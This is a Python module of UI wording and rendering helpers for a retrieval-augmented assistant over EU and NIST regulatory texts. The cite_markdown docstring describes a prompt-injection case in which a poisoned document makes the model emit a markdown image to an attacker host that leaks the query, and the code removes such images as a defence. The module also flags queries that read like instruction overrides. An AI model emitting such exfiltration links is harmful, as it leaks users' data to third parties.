"""Pure presentation logic for the UI: all wording lives here, no Streamlit imports.

Design motif: the *relevance floor*.  Every passage the retriever returns has a
cosine score; passages under the floor are never shown to the model, and when
none clear it the system abstains instead of generating.  The UI draws that line.
"""
from __future__ import annotations

import html
import re
from typing import Any, Dict, List, Optional, Tuple

_CITE_RE = re.compile(r"\[(\d+)\](?!\()")
_IMAGE_RE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_SENTENCE_RE = re.compile(r"(?<=[.!?])\s+")

EXAMPLES = [
    "What is retrieval-augmented generation and how does it work?",
    "How does zero-shot question generation improve passage retrieval?",
    "What are the I/O bottlenecks in approximate nearest neighbor search on SSDs?",
    "Who won the 2018 FIFA World Cup?",
]

# Regulatory knowledge base (namespace regs-v1): official EU and NIST text, with dates.
REGS_NAMESPACE = "regs-v1"
FRAMEWORKS = ["EU AI Act", "GDPR", "NIS2", "DORA", "Cyber Resilience Act", "NIST SP 800-53", "NIST CSF 2.0",
              "NIST AI RMF"]
REGS_EXAMPLES = [
    "When must a personal data breach be reported?",
    "Do the AI Act's high-risk obligations already apply to a CV-screening tool?",
    "What are the incident reporting deadlines across EU rules?",
    "What does HIPAA require?",
]
HIGH_RISK = {"Not sure": None, "Annex III (e.g. hiring, credit, education)": "annex_iii",
             "Annex I (safety component of a regulated product)": "annex_i", "Not high-risk": "none"}

_ROLE_WORDS = {"annex_iii": "Annex III", "annex_i": "Annex I", "none": "not high-risk", "unknown": "high-risk unknown"}
_ROUTE_REPLY = {
    "out_of_scope": "The question names rules this knowledge base does not cover, so nothing was searched",
    "licensed": "The question names a licensed standard, whose text is not in the public knowledge base",
    "not_available": "Recognised a request for a {intent}, which is not available yet",
    "clarify": "The request needs more detail before anything can be looked up",
}
_ABSTAIN_VERDICT = {
    "out_of_scope": ("gray", "Not covered here"),
    "licensed": ("gray", "Licensed standard"),
    "not_available": ("blue", "Not available yet"),
    "clarify": ("blue", "Needs more detail"),
}

_REJECTED = {
    "refusal": "it was a refusal",
    "answer": "it answered instead of searching",
    "new_facts": "it added facts that were not in the question",
    "empty": "it was empty",
}

PALETTE = {
    False: {"keep": "#2E6B5B", "drop": "#B9C2BB", "floor": "#C9661E", "track": "#E8EDE7", "text": "#17202A"},
    True: {"keep": "#6DB89E", "drop": "#3A4650", "floor": "#E8913F", "track": "#1A2229", "text": "#E4EAE5"},
}


def _ms(ms: Optional[float]) -> str:
    return f" · `{ms:,.0f} ms`" if ms else ""


def cite_markdown(answer: str, n_sources: int) -> str:
    """Render [n] citations as badges; flag the ones that point at no source.

    Markdown images are removed first: a poisoned document can steer the model into
    emitting ![](https://attacker/?q=...), which every viewer's browser would fetch.
    """
    answer = _IMAGE_RE.sub("(image removed)", answer)

    def badge(m: re.Match) -> str:
        n = int(m.group(1))
        return f":green-badge[{n}]" if 1 <= n <= n_sources else f":orange-badge[{n} · no source]"
    return _CITE_RE.sub(badge, answer)


def citing_sentences(answer: str, n: int) -> List[str]:
    return [s.strip() for s in _SENTENCE_RE.split(answer) if f"[{n}]" in s]


def step_line(step: Dict[str, Any]) -> str:
    """One line of the pipeline trace, in plain language."""
    sid, status, d, ms = step["id"], step["status"], step.get("detail") or {}, step.get("ms")
    if sid == "route":
        reason = d.get("abstain_reason")
        if reason in _ROUTE_REPLY:
            return _ROUTE_REPLY[reason].format(intent=str(d.get("intent") or "").replace("_", " "))
        noted = profile_words(d.get("profile_updates") or {})
        return "Understood as a question about the rules" + (f" · noted: {noted}" if noted else "")
    if sid == "retrieve":
        line = f"Retrieved {d.get('hits', 0)} passages · best match `{d.get('top_score', 0.0):.2f}`"
        if d.get("rewritten_query"):
            line += f" · searched for “{d['rewritten_query']}”"
        return line + _ms(ms)
    if sid == "correct":
        action = str(d.get("action") or "")
        if action == "skipped:instruction_override":
            return "Skipped query rewriting: the question reads like an instruction, not a search"
        if action.startswith("rewrite_rejected:"):
            why = _REJECTED.get(action.split(":", 1)[1], "it was not a search query")
            return f"Kept the original question: the suggested rewrite was discarded because {why}"
        return f"Weak match, so the question was rewritten and searched again ({d.get('iterations', 0)}×)"
    if sid == "web":
        return f"Searched the web · {d.get('results', 0)} results" + _ms(ms)
    if sid == "gate":
        floor, scores = d.get("floor", 0.0), d.get("scores") or []
        if d.get("abstain"):
            return (f"Nothing cleared the relevance floor `{floor:.2f}`, "
                    "so no answer was generated")
        web = f" + {d['web']} web results" if d.get("web") else ""
        return f"{d.get('kept', 0)} of {len(scores)} passages cleared the relevance floor `{floor:.2f}`{web}"
    if sid == "generate":
        if status == "skipped":
            return ""  # the gate line already says why nothing was generated
        return ":shimmer[Writing the answer…]" if status == "running" else ("Wrote the answer" + _ms(ms))
    if sid == "verify":
        dangling = d.get("dangling") or []
        tail = f" · {len(dangling)} citation(s) point at no source" if dangling else ""
        if d.get("grounded") is True:
            return f"Checked against the passages: grounded `{d.get('faithfulness_score') or 0:.2f}`{tail}" + _ms(ms)
        if d.get("grounded") is False:
            return f"Checked against the passages: **not supported**{tail}" + _ms(ms)
        return f"Citations checked{tail} · grounding judge is off on this server"
    return sid


def profile_words(profile: Dict[str, Any]) -> str:
    words = [str(r).replace("_", " ") for r in profile.get("roles") or []]
    if profile.get("high_risk"):
        words.append(_ROLE_WORDS.get(profile["high_risk"], str(profile["high_risk"])))
    words += [label for key, label in (("ai_system", "AI system"), ("gpai_model", "general-purpose AI model"),
                                      ("personal_data", "personal data"), ("eu_market", "EU market"))
              if profile.get(key)]
    if profile.get("sector"):
        words.append(str(profile["sector"]))
    return ", ".join(words)


def status_label(src: Dict[str, Any]) -> Optional[Tuple[str, str]]:
    """(badge color, text) for a provision's applicability on the as-of date; None outside the regs corpus."""
    st, frm = src.get("status"), src.get("applies_from")
    if not st:
        return None
    return {
        "applies": ("green", f"in force since {frm}"),
        "not_yet": ("orange", f"applies from {frm}"),
        "depends": ("violet", "date depends on classification"),
        "voluntary": ("gray", "voluntary framework"),
    }.get(st, ("gray", "interpretive, no date of its own"))


def chip_label(n: int, src: Dict[str, Any]) -> str:
    label = status_label(src)
    if src.get("ref") and label:
        return f"{n} · {src['ref']} · {label[1]}"
    title = (src.get("title") or f"Source {n}")[:42]
    score = "web" if src.get("source") == "web" else f"{float(src.get('score') or 0):.2f}"
    return f"{n} · {title} · {score}"


def trace_summary(abstained: bool, total_ms: float, n_sources: int, reason: Optional[str] = None) -> str:
    secs = f"{total_ms / 1000:.1f} s"
    if abstained and reason in ("out_of_scope", "licensed"):
        return f"Declined in {secs} · outside the covered rules"
    if abstained and reason in ("not_available", "clarify"):
        return f"Replied in {secs} · nothing was searched"
    if abstained:
        return f"Abstained in {secs} · nothing relevant enough in the knowledge base"
    return f"Answered in {secs} · {n_sources} source{'s' if n_sources != 1 else ''}"


def verdict(response: Dict[str, Any]) -> Tuple[str, str]:
    """(badge color, label) for the answer's trust state."""
    if response.get("insufficient_context"):
        return _ABSTAIN_VERDICT.get(response.get("abstain_reason"), ("orange", "Not in the knowledge base"))
    grounded, score = response.get("grounded"), response.get("faithfulness_score")
    if grounded is True:
        return "green", f"Grounded · {score:.2f}" if score is not None else "Grounded"
    if grounded is False:
        return "red", f"Not supported by sources · {score:.2f}" if score is not None else "Not supported by sources"
    return "gray", "Grounding not checked"


def floor_bars_html(scores: List[float], floor: float, dark: bool) -> str:
    """Every candidate passage as a bar against the relevance floor (the signature view)."""
    c = PALETTE[dark]
    top = max([*scores, floor * 2, 0.5]) * 1.08
    rows = []
    for i, s in enumerate(scores, 1):
        kept = s >= floor
        rows.append(
            f'<div data-kept="{str(kept).lower()}" style="display:flex;align-items:center;gap:8px;margin:3px 0">'
            f'<span style="width:1.4em;text-align:right;opacity:.7">{i}</span>'
            f'<div style="position:relative;flex:1;height:10px;background:{c["track"]};border-radius:5px">'
            f'<div style="width:{s / top * 100:.1f}%;height:100%;border-radius:5px;'
            f'background:{c["keep"] if kept else c["drop"]}"></div>'
            f'<div style="position:absolute;left:{floor / top * 100:.1f}%;top:-3px;bottom:-3px;width:2px;'
            f'background:{c["floor"]}"></div></div>'
            f'<span style="width:3.2em;text-align:right">{s:.2f}</span></div>'
        )
    return (
        f'<div style="font-family:\'Martian Mono\',monospace;font-size:11px;color:{c["text"]}">'
        + "".join(rows)
        + f'<div style="margin-top:4px;color:{c["floor"]}">│ relevance floor {floor:.2f}</div></div>'
    )


def esc(text: str) -> str:
    return html.escape(text or "")
